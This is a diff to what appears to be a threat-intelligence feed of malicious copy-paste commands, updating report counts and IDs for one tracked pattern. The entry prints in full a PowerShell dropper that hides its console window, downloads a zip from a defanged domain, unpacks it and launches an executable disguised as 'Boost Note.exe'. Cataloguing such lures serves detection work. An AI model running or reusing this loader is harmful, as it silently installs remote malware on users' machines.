@@ -779,9 +779,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 50,
+    "ReportCount": 53,
     "FirstSeen": "2026-11-10T04:54:46.148000+00:00",
-    "LastSeen": "2026-11-17T01:21:32.121000+00:00",
+    "LastSeen": "2026-11-17T01:49:13.081000+00:00",
     "ReportIds": [
       "cmwa7uhjs07yx0omlfjdv2k9y",
       "cmwafa1yg08ee0omlkfez3dt8",
@@ -832,7 +832,10 @@
       "cmwjgldww18ag0omls2876jau",
       "cmwjslc4f18z40omlmg91ed88",
       "cmwjtkxy018zw0omloccp4asm",
-      "cmwk0b89t19c30oml69o3fcb7"
+      "cmwk0b89t19c30oml69o3fcb7",
+      "cmwk0sutc19dk0omldqs77qbt",
+      "cmwk19p8v19fi0omldrlx19g0",
+      "cmwk1atw219gr0oml6sk6cbtv"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
